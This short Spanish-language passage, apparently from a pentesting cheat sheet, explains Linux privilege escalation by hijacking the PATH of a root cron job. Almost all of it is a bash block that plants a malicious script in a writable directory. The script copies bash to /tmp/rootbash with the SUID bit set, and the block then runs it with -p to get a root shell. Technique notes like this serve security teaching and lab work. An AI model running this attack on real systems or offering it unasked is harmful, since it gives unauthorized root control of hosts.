Un cron job ejecuta un script sin ruta absoluta y el PATH incluye directorios escribibles.

```bash
# Ejemplo en /etc/crontab:
# PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin
# * * * * * root overwrite.sh

# Verificar que podemos escribir en /home/user
ls -la /home/user

# Crear script malicioso
cat > /home/user/overwrite.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF

chmod +x /home/user/overwrite.sh

# Esperar a que el cron ejecute (máximo 1 minuto)
# Luego obtener shell de root
/tmp/rootbash -p
```

